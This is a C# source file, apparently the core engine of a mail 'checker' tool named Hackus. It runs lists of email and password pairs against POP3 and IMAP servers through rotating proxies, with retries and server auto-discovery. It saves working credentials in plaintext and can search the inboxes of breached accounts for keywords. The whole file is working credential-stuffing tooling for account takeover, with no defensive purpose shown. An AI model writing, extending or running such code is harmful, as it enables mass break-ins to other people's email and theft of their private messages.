using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using Clean_Hackus_NET8.Models;
using Clean_Hackus_NET8.Models.Enums;
using Clean_Hackus_NET8.Net.Mail;
using Clean_Hackus_NET8.Services.Managers;

namespace Clean_Hackus_NET8.Services;

/// <summary>
/// Core checking engine with smart retry. Uses MailKit for IMAP/POP3.
/// Normal: POP3 SSL → Non-SSL → IMAP SSL → Non-SSL
/// Keyword mode: IMAP only
/// </summary>
public class CheckerEngine
{
    private readonly ServerDatabase _serverDb = ServerDatabase.Instance;
    private readonly StatisticsManager _stats = StatisticsManager.Instance;
    private readonly ProxyManager _proxies = ProxyManager.Instance;
    private readonly ResultsSaver _results = ResultsSaver.Instance;

    private const int MAX_RETRIES = 2;
    private static readonly int[] RETRY_DELAYS_MS = [500, 1500];

    public async Task CheckMailboxAsync(Mailbox mailbox, CancellationToken ct)
    {
        var domain = mailbox.Domain;
        var keywordMode = KeywordSettings.Instance.Enabled && KeywordSettings.Instance.HasKeywords;

        var serversToTry = BuildFallbackChain(domain, keywordMode);

        // Auto-discover POP3 if no servers found
        if (serversToTry.Count == 0 && !keywordMode)
        {
            try
            {
                var discovered = await ServerDiscovery.DiscoverPop3Async(domain, ct);
                if (discovered != null)
                {
                    _serverDb.SavePop3ToCache(discovered);
                    serversToTry = BuildFallbackChain(domain, keywordMode);
                }
            }
            catch { }
        }

        if (serversToTry.Count == 0)
        {
            _stats.IncrementNoHost();
            await _results.SaveNoHostAsync($"{mailbox.Address}:{mailbox.Password}");
            return;
        }

        foreach (var server in serversToTry)
        {
            ct.ThrowIfCancellationRequested();

            var result = await TryServerWithRetryAsync(mailbox, server, keywordMode, ct);

            switch (result)
            {
                case OperationResult.Ok:
                    _stats.IncrementGood();
                    await _results.SaveGoodAsync($"{mailbox.Address}:{mailbox.Password} | {server.Protocol} {server.Socket} {server.Hostname}:{server.Port}");
                    return;

                case OperationResult.Bad:
                    _stats.IncrementBad();
                    await _results.SaveBadAsync($"{mailbox.Address}:{mailbox.Password}");
                    return;

                case OperationResult.Error:
                    continue; // try next server in fallback chain
            }
        }

        // All servers failed with Error
        _stats.IncrementError();
        await _results.SaveErrorAsync($"{mailbox.Address}:{mailbox.Password}");
    }

    /// <summary>Smart retry: only retries connection errors, not auth failures.</summary>
    private async Task<OperationResult> TryServerWithRetryAsync(Mailbox mailbox, Server server, bool keywordMode, CancellationToken ct)
    {
        for (int attempt = 0; attempt <= MAX_RETRIES; attempt++)
        {
            ct.ThrowIfCancellationRequested();

            if (attempt > 0)
                await Task.Delay(RETRY_DELAYS_MS[Math.Min(attempt - 1, RETRY_DELAYS_MS.Length - 1)], ct);

            var result = await TryServerAsync(mailbox, server, keywordMode, ct);
            if (result != OperationResult.Error)
                return result;
        }

        return OperationResult.Error;
    }

    private List<Server> BuildFallbackChain(string domain, bool keywordMode)
    {
        var chain = new List<Server>();

        if (!keywordMode)
        {
            var pop3 = _serverDb.GetPop3Servers(domain);
            if (pop3 != null)
            {
                foreach (var s in pop3) if (s.Socket == SocketType.SSL) chain.Add(s);
                foreach (var s in pop3) if (s.Socket == SocketType.Plain) chain.Add(s);
            }
            if (pop3 == null || pop3.Count == 0)
            {
                chain.Add(new Server { Domain = domain, Hostname = $"pop.{domain}", Port = 995, Protocol = ProtocolType.POP3, Socket = SocketType.SSL });
                chain.Add(new Server { Domain = domain, Hostname = $"pop.{domain}", Port = 110, Protocol = ProtocolType.POP3, Socket = SocketType.Plain });
            }
        }

        var imap = _serverDb.GetImapServers(domain);
        if (imap != null)
        {
            foreach (var s in imap) if (s.Socket == SocketType.SSL) chain.Add(s);
            foreach (var s in imap) if (s.Socket == SocketType.Plain) chain.Add(s);
        }
        if (imap == null || imap.Count == 0)
        {
            chain.Add(new Server { Domain = domain, Hostname = $"imap.{domain}", Port = 993, Protocol = ProtocolType.IMAP, Socket = SocketType.SSL });
            chain.Add(new Server { Domain = domain, Hostname = $"imap.{domain}", Port = 143, Protocol = ProtocolType.IMAP, Socket = SocketType.Plain });
        }

        return chain;
    }

    private async Task<OperationResult> TryServerAsync(Mailbox mailbox, Server server, bool keywordMode, CancellationToken ct)
    {
        IMailHandler? handler = null;
        try
        {
            handler = server.Protocol switch
            {
                ProtocolType.POP3 => new Pop3Client(mailbox, server),
                ProtocolType.IMAP => new ImapClient(mailbox, server),
                _ => null
            };

            if (handler == null) return OperationResult.Error;

            var proxy = _proxies.GetNextProxy();
            var connectResult = await handler.ConnectAsync(proxy, ct);
            if (connectResult != OperationResult.Ok) return OperationResult.Error;

            var loginResult = await handler.LoginAsync(ct);

            if (loginResult == OperationResult.Ok && keywordMode && handler is ImapClient imapClient)
            {
                var selectResult = await imapClient.SelectFolderAsync(new Folder { Name = "INBOX" }, ct);
                if (selectResult == OperationResult.Ok)
                {
                    var query = KeywordSettings.Instance.BuildImapSearchQuery();
                    var uids = await imapClient.SearchAsync(query, ct);
                    if (uids.Count > 0)
                    {
                        _stats.IncrementFound();
                        await _results.SaveAsync("Found.txt",
                            $"{mailbox.Address}:{mailbox.Password} | KEYWORD ({uids.Count} msgs) | {server.Hostname}:{server.Port}");
                    }
                }
            }

            await handler.DisconnectAsync(ct);
            return loginResult;
        }
        catch (OperationCanceledException) { throw; }
        catch { return OperationResult.Error; }
        finally { handler?.Dispose(); }
    }
}
